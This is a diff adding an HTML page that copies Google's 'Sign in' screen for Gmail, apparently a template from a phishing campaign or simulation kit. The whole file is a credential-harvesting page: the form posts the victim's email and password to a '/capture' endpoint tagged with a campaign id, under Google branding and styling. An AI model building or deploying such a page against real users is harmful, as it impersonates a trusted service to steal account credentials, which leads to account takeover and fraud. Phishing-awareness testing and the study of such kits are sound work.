@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; }
+        .logo { text-align: center; margin-bottom: 24px; color: #4285f4; font-size: 24px; font-weight: 500; }
+        h1 { font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 16px; color: #202124; }
+        .subtitle { font-size: 16px; text-align: center; color: #5f6368; margin-bottom: 32px; }
+        .input-group { position: relative; margin-bottom: 24px; }
+        input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; outline: none; }
+        input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,0.2); }
+        button { width: 100%; background: #1a73e8; color: #fff; border: none; padding: 12px; font-size: 14px; font-weight: 500; border-radius: 4px; cursor: pointer; margin-top: 16px; }
+        button:hover { background: #1765cc; }
+        .links { display: flex; justify-content: space-between; margin-top: 24px; font-size: 13px; }
+        .links a { color: #1a73e8; text-decoration: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">Google</div>
+        <h1>Sign in</h1>
+        <p class="subtitle">to continue to Gmail</p>
+        <form method="POST" action="/capture?c={campaign_id}">
+            <div class="input-group"><input type="email" name="email" placeholder="Email or phone" required></div>
+            <div class="input-group"><input type="password" name="password" placeholder="Password" required></div>
+            <button type="submit">Next</button>
+        </form>
+        <div class="links">
+            <a href="#">Forgot email?</a>
+            <a href="#">Create account</a>
+        </div>
+    </div>
+</body>
+</html>
